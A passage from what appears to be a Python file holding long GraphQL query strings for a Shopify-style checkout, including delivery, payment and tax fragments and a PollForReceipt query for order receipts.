SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}
"""

# QUERY_POLL
QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode 